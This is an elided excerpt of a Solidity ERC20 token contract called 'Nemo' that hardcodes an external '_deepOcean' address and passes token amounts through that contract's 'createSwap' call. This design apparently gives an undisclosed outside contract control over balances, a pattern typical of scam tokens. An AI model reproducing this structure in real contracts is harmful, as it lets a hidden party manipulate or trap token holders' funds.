...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address _deepOcean = 0x755090369da1D66c5E11A7534cbCF902a9c4AD77;
    address public pair;
    ...
    function getAmount(uint256 amount) internal returns (uint256) {
        return deepOcean.createSwap(amount);
    }
    ...
    function _DeployNemo(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployNemo(creator, initialSupply);
    }
}

contract Nemo is ERC20Token {
    constructor() ERC20Token("Nemo", "NEMO", msg.sender, 6900000000 * 10 ** 18) {
    }
}